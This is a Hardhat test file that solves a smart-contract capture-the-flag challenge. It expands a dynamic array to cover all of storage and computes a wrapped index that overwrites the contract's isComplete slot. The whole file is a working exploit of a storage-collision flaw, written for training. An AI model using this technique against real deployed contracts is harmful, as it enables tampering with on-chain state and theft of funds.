import { expect } from "chai";
import { BigNumber, utils } from "ethers";
import { ethers } from "hardhat";

describe("MappingChallenge", () => {
  it("Solves the challenge", async () => {
    const factory = await ethers.getContractFactory("MappingChallenge");
    const contract = await factory.deploy();
    await contract.deployed();

    const MAX_UINT_256 = BigNumber.from("2").pow("256");

    // Expand the map to it max capacity
    const expandTx = await contract.set(MAX_UINT_256.sub("2"), 1);
    await expandTx.wait();

    // Overwrite the isComplete storage slot
    const mapStartAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";
    const mapDataSlot = BigNumber.from(utils.keccak256(mapStartAddress));
    const isCompleteSlot = MAX_UINT_256.sub(mapDataSlot);
    const completeTx = await contract.set(isCompleteSlot, "1");
    await completeTx.wait();

    expect(await contract.isComplete()).to.be.true;
  });
});
